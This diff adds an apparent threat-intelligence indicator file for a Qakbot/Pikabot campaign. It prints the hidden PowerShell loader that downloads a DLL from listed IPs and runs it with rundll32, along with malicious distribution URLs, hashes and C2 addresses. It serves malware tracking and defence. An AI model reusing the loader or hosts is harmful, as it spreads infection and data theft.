@@ -1,0 +1,287 @@
+23.05.2023 | Qakbot / Pikabot | BB29 | Campaign  | Version
+
+*************************************************
+
+.url https://1mtiktok.com/irci/?1
+.js 8dd358cfe68091679e029b978e52bb9edd30deb1cc64e5fe6c80aec23c2e5297
+.dll e2723661efa1115c81bb13238b5925422ef3abf89909e005f7da6c4671d67930
+
+*************************************************
+
+Exec >
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\apiose.js
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\Unreflectively.js KeloidUmbratic transfigure CrayletLeucoindigo nonsubordinateArdelio 
+
+powershell.exe - WindowStyle Hidden - ExecutionPolicy Bypass - NoLogo - NoProfile - encodedcommand $Chimopelagic = "aAB0AHQAcABzADoALwAvADIANAAyAC4AMQA2ADYALgAxADUANAAuADEAOAAxAA==";
+$Curlicuing = "aAB0AHQAcAA6AC8ALwAxADgAMAAuADEAMAA0AC4AMgAyADIALgAxADUAOQA=";
+$Tincting = "aAB0AHQAcABzADoALwAvADkANAAuADEAMAAwAC4AMgAzADcALgAxADUAOQA=IUFnaAB0AHQAcABzADoALwAvADEAMgA3AC4AOAA0AC4AMgAzADAALgAxADAAOQA=";
+$foaledForlore = "http://147.230.150.112/g3Zb/Q http://162.181.81.251/0CS4/V http://188.133.125.159/1/BEI http://151.236.14.179/DekOPg/5RfoXCsju http://192.121.17.68/9Cm9EW/FNQTzgi http://192.121.17.92/JTi/uP5VlYyqS";
+foreach($PhrasallyZoogleal in $foaledForlore - split "FBQt") {
+    $frettersTousche = "https://196.108.69.96";
+    try {
+        $AdaptationalAnconoid = "http://203.205.58.178";
+        $boethusian = "aAB0AHQAcABzADoALwAvADEAMQA1AC4AMQAyADYALgAyADQAMgAuADIANAA2AA==vCaAB0AHQAcAA6AC8ALwAxADUAMQAuADIAMAA4AC4ANQAwAC4AMQA1ADgAvCaAB0AHQAcAA6AC8ALwBzAHQAaQBjAGsAaQBlAHIASQBuAGYAZQBjAHQAaQBvAHUAcwBuAGUAcwBzAC4AYwBvAG0A";
+        $honiton = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($PhrasallyZoogleal));
+        Invoke - WebRequest $honiton - O $env: ProgramData\ trichoglossidae.Symphily;
+        $UnerroneousInjector = "aAB0AHQAcAA6AC8ALwA2ADAALgAyADAAMQAuADQAOAAuADEAMwAwAA==kCUaaAB0AHQAcAA6AC8ALwBGAGkAcgBlAHQAbwB3AGUAcgAuAGYAbwB1AG4AZABhAHQAaQBvAG4AkCUaaAB0AHQAcABzADoALwAvADEAMgA1AC4AMQAwADgALgA0ADUALgAyADEAOAA=";
+        $Shapesmith = "aAB0AHQAcABzADoALwAvAEMAbwBuAGQAZQBzAGMAZQBuAGQAZQBuAGMAZQBDAGEAdAB0AHkAcABoAG8AaQBkAC4AbAB1AA==";
+        if ((Get - Item - Path $env: ProgramData\ trichoglossidae.Symphily).Length - ge 295186) {
+            powershell - encodedcommand "start rundll32 $env:ProgramData\trichoglossidae.Symphily,vips;MITLicense";
+            $Stinkbugs = "aAB0AHQAcAA6AC8ALwAxADMANgAuADIANAA3AC4AMQAwADUALgAxADcAMwA=eqSaAB0AHQAcABzADoALwAvAGMAegBhAHIAaQBzAHQAaQBjAC4AbQBlAG4AeqSaAB0AHQAcAA6AC8ALwBwAGkAbgBjAGgAZwB1AHQALgBoAGEAbQBiAHUAcgBnAA==eqSaAB0AHQAcABzADoALwAvAGMAbwBuAGYAZQBzAHMAaQBvAG4AcwAuAHQAbwB1AHIAcwA=";
+            $Biloculine = "aAB0AHQAcABzADoALwAvADQAOQAuADEAOAA3AC4AMQA5ADgALgAxADIAMQA=PaAB0AHQAcAA6AC8ALwAxADIAOAAuADkANgAuADIAMQAyAC4AMgA0ADQAPaAB0AHQAcABzADoALwAvAEEAbAB0AGEAaQByAEwAaQBwAGEAcwBlAHMALgBzAGEAbABlAA==PaAB0AHQAcAA6AC8ALwAxADMANAAuADIANQAxAC4AMgAwADgALgAxADEAOQA=";
+            break;
+        }
+    } catch {
+        $Nonsubstantiality = "http://255.83.97.40=";
+        $ExpropriatorChondropterygii = "https://TruncatorotundReliquefied.capetown";
+        $precoxZoophilism = "aAB0AHQAcAA6AC8ALwBjAGgAcgB5AHMAYQB0AHIAbwBwAGkAYwBGAGwAZQBjAG4AbwBkAGUALgBmAGEAbgBzAA==HaAB0AHQAcAA6AC8ALwB1AG4AcABsAHUAZwAuAGcAbwBsAGQAHaAB0AHQAcABzADoALwAvADEANQA2AC4AMQA3ADAALgA2ADYALgAyADAAMQA=";
+    }
+}
+$chutneesVenomly = "http://121.203.177.176";
+$trichoglossidae = "https://talukdar.city";
+
+*************************************************
+
+.zip distro
+
+https://1mtiktok.com/irci/?1
+https://400-sy.com/uar/?1
+https://7telecom.co.uk/amna/?1
+https://aaieparking.com/ubo/?1
+https://abbottminerals.com/vpma/?1
+https://acnoemporium.com/auf/?1
+https://africatravelhub.com/ee/?1
+https://agenciailever.com/uetr/?1
+https://aiatms.com/nit/?1
+https://akhtarweb.com/eo/?1
+https://alhindmetal.com/xe/?1
+https://allpinless.com/us/?1
+https://alplimpieza.com/scxa/?1
+https://alqayyumjewellery.com/meq/?1
+https://aojelectrical.com/quii/?1
+https://asalpro.com/doo/?1
+https://asimshahid.com/ic/?1
+https://aslamcheval.net/au/?1
+https://attractionsinuganda.com/ai/?1
+https://barakatpharmacy.com/ioe/?1
+https://basenaija.com/topu/?1
+https://bellstowingandrecovery.com/me/?1
+https://besteducationlearn.com/rud/?1
+https://bibianos.com/vnt/?1
+https://bighits4u.com/umua/?1
+https://billionairesrealestate.com/ett/?1
+https://biocoreopen.org/eute/?1
+https://bismihomeappliance.com/tvug/?1
+https://blockcereal.com/ai/?1
+https://boardroomeducation.com/elmr/?1
+https://bola168jaya.com/ms/?1
+https://brokersresiduos.com/miu/?1
+https://brrflooring.com/or/?1
+https://brusselspools.com/iv/?1
+https://buildersoncall.com/uut/?1
+https://caswillow.com/lduq/?1
+https://cellconexion.com/auu/?1
+https://cemahosting.com/lo/?1
+https://centralvalleylaw.com/hui/?1
+https://centromonticello.it/diuq/?1
+https://chicagopowerball.com/na/?1
+https://ciaraegan.com/stii/?1
+https://clipsodoma.com/aafi/?1
+https://clubmarketingdeafiliados.com/ei/?1
+https://codelinkinfotech.com/soe/?1
+https://cointrasur.com/ics/?1
+https://cometoread.com/xm/?1
+https://commandoforex.com/utqe/?1
+https://confixtech.com/dr/?1
+https://contonisiempreganas.com/aiup/?1
+https://cumarefrigeration.com/rdul/?1
+https://cutacut.com/ihii/?1
+https://daekmutiara.com/man/?1
+https://datastatresearch.org/re/?1
+https://dbaccess.com/sp/?1
+https://delwanqatar.com/taar/?1
+https://development-eg.com/sm/?1
+https://dewanpolycaps.com/eq/?1
+https://digitalnetcenters.com/aat/?1
+https://dondeelgordo.com/aatf/?1
+https://dristiindia.com/su/?1
+https://drsalam.net/apsp/?1
+https://dtbhauling.com/sbtd/?1
+https://duxforexsignals.com/oe/?1
+https://eclatinternational.com/nn/?1
+https://ecuadorstereo.com/euto/?1
+https://edubrovnik.org/duqi/?1
+https://egyptafrica.net/tse/?1
+https://electronicsrus.co.uk/aeer/?1
+https://emailclues.com/oi/?1
+https://emmanuelgroup.org/nis/?1
+https://escuelagrafica.com/rnet/?1
+https://ethio-health.com/mume/?1
+https://fahmy-group.com/iquo/?1
+https://famigliacosmica.com/rsnr/?1
+https://farmacomdemexico.com/rsre/?1
+https://felaminestate.com/tad/?1
+https://flixfallen.com/iev/?1
+https://fodexy.com/rn/?1
+https://foneunits.com/cois/?1
+https://forbesadvert.com/ns/?1
+https://foysalofficial.com/re/?1
+https://fukutex.net/tle/?1
+https://gawahweekly.com/gps/?1
+https://geneclickbio.com/aee/?1
+https://geoguy.org/ma/?1
+https://globalboardadvisors.com/nrum/?1
+https://goromgorom.com/raun/?1
+https://growmoremaids.com/uas/?1
+https://hanavillagehomes.com/iq/?1
+https://havana4d.com/ta/?1
+https://hgltourafrica.com/dt/?1
+https://hidirfindik.com/iq/?1
+https://higherquantum.com/rtt/?1
+https://hphc.org.in/bif/?1
+https://hurghada-fs.com/txm/?1
+https://ibrasp.org.br/tc/?1
+https://idc2.org/pu/?1
+https://ieeu.net/no/?1
+https://imanagementpro.com/nm/?1
+https://inmersionenidiomas.com/egtu/?1
+https://internationalimmigrationconsultants.com/olci/?1
+https://iqrabooksbd.com/aate/?1
+https://islandmuslimcommunity.org/rte/?1
+https://iwebtravel.com/et/?1
+https://jklc.org/ae/?1
+https://jobs-sa.net/pent/?1
+https://jordanpackage.com/tsea/?1
+https://joshuashome.org/aau/?1
+https://jupeganshop.com/tute/?1
+https://kashmirwatch.com/te/?1
+https://katramiz.com/rert/?1
+https://lacadenaherrumbrosa.net/st/?1
+https://lahotte.net/pl/?1
+https://layalinatent.com/lt/?1
+https://leafsols.com/at/?1
+https://lesdeuxpalmiers.com/nuam/?1
+https://maazthadal.com/si/?1
+https://makonafm.com/tbus/?1
+https://malpanipipes.com/ri/?1
+https://market-mirror.com/osp/?1
+https://marveldecorltd.com/ale/?1
+https://marvsafarisug.com/de/?1
+https://mattgoldenberg.net/dsaa/?1
+https://maxxuselanza.com/pi/?1
+https://medicareassistanceprogram.com/teut/?1
+https://micro-it.co.uk/saas/?1
+https://mortalflix.com/ee/?1
+https://msaedtech.com/eve/?1
+https://muebleshotel.com/aa/?1
+https://naqvisports.com/pou/?1
+https://nashikartfoundation.com/uie/?1
+https://nesral3roba.com/iua/?1
+https://ninetofab.com/obpe/?1
+https://nobleclassclothing.com/la/?1
+https://nvajewelers.com/sol/?1
+https://nyptpob.com/mmii/?1
+https://odontosantillans.com/eua/?1
+https://opencartturkey.com/imu/?1
+https://orionsligi.com/el/?1
+https://ortopediawong.com/al/?1
+https://osam.org.ar/eta/?1
+https://ox-literie.com/sl/?1
+https://paperpush.com/eua/?1
+https://parfamservices.com/emhi/?1
+https://patmypets.com/sson/?1
+https://patriot-stdenistowing.com/mo/?1
+https://pattersonoil.co.uk/pte/?1
+https://paypaddi.com/if/?1
+https://peasx.com/nu/?1
+https://perchstoneandgraeys.com/adtt/?1
+https://picc-penang.com/ia/?1
+https://pillsenergy.com/aeah/?1
+https://pointblanknews.com/ea/?1
+https://popeyespizzachicken.com/nci/?1
+https://preneticsresearchind.com/mnso/?1
+https://pristineoftheocean.com/tuv/?1
+https://programmer-riyad.com/nes/?1
+https://prosoftitservices.com/oodu/?1
+https://pvaseller.com/ie/?1
+https://qilifemastery.com/lem/?1
+https://qmix.fr/trro/?1
+https://realgreengoldltd.com/cep/?1
+https://reposebay.com/tuaa/?1
+https://restaurant-lavie.de/ine/?1
+https://risinghopegirlseducation.com/ev/?1
+https://rnltechnologies.com/rpru/?1
+https://royaleagletravel.com/un/?1
+https://rstransbrokerage.com/itti/?1
+https://saharascientific.com/tnse/?1
+https://sahityaclasses.com/pm/?1
+https://samasugroup.com/vots/?1
+https://samequalitiesfoundation.org/ua/?1
+https://sandlerandassociates.com/ilu/?1
+https://santerreetfils.com/cd/?1
+https://sauanart.com/ui/?1
+https://scaleoutmedia.com/tqis/?1
+https://sirinatureroost.com/lft/?1
+https://snehalkannaujia.com/stoe/?1
+https://sociopoolindia.com/oo/?1
+https://softsols.net/ao/?1
+https://spartancv.co.uk/on/?1
+https://spotlightstravels.com/ili/?1
+https://sumanhospital.org/uai/?1
+https://szquman.com/aod/?1
+https://tacosdonmanolito.com/cu/?1
+https://techafresh.com/qu/?1
+https://techviralos.com/fee/?1
+https://tenagakerja.org/ttie/?1
+https://terre225.com/edes/?1
+https://thebitnbytes.com/osmr/?1
+https://theharvestworldwide.com/tu/?1
+https://tiendamerik.net/ttao/?1
+https://tip-cleaning.com/rpc/?1
+https://torioinvestors.com/oeo/?1
+https://torkeytrading.com/omel/?1
+https://troispyramides.com/rmr/?1
+https://ugwluxury.com/avtt/?1
+https://ukecpakistan.com/tei/?1
+https://ultimatenursing.org/dta/?1
+https://vans-towing.com/uuti/?1
+https://vccrp.com/av/?1
+https://veerayatan.org/utl/?1
+https://viralkns.com/oilr/?1
+https://visioni2c.com/tv/?1
+https://wealthaward.com/in/?1
+https://woodtechsolution.com/qi/?1
+https://woodtechsolutionbd.com/qm/?1
+https://xboxvicio.com/mt/?1
+https://xpressfreightsolutions.com/ce/?1
+https://z-physique.com/uuat/?1
+https://zafarsithub.com/ouom/?1
+https://zamzamtradingbd.com/qr/?1
+https://zankgroup.fr/ev/?1
+https://zorganicfiji.com/oam/?1
+
+.dll distro
+
+http://192.121.17.92/JTi/MYWvduH2rC
+http://192.121.17.68/9Cm9EW/zNVBRnMD
+http://151.236.14.179/DekOPg/EgrEd7yT
+
+*************************************************
+
+c2's
+
+129.213.54.49:2078
+185.87.148.132:1194
+192.9.135.73:1194
+38.54.33.239:2222
+45.85.235.39:2078
+45.85.235.39:2078
+
+https://129.213.54.49:2078/Malleolus/W9DBYqYtjnUTqQTKj?Describes=Soredium&milwaukeeOverready=Describes&smokies=hendecylUnmatureness
+https://185.87.148.132:1194/Malleolus/W9DBYqYtjnUTqQTKj?Describes=Soredium&milwaukeeOverready=Describes&smokies=hendecylUnmatureness
+https://192.9.135.73:1194/Malleolus/W9DBYqYtjnUTqQTKj?Describes=Soredium&milwaukeeOverready=Describes&smokies=hendecylUnmatureness
+https://38.54.33.239:2222/Malleolus/W9DBYqYtjnUTqQTKj?Describes=Soredium&milwaukeeOverready=Describes&smokies=hendecylUnmatureness
+https://45.85.235.39:2078/Malleolus/W9DBYqYtjnUTqQTKj?Describes=Soredium&milwaukeeOverready=Describes&smokies=hendecylUnmatureness
+https://45.85.235.39:2078/Malleolus/W9DBYqYtjnUTqQTKj?Describes=Soredium&milwaukeeOverready=Describes&smokies=hendecylUnmatureness
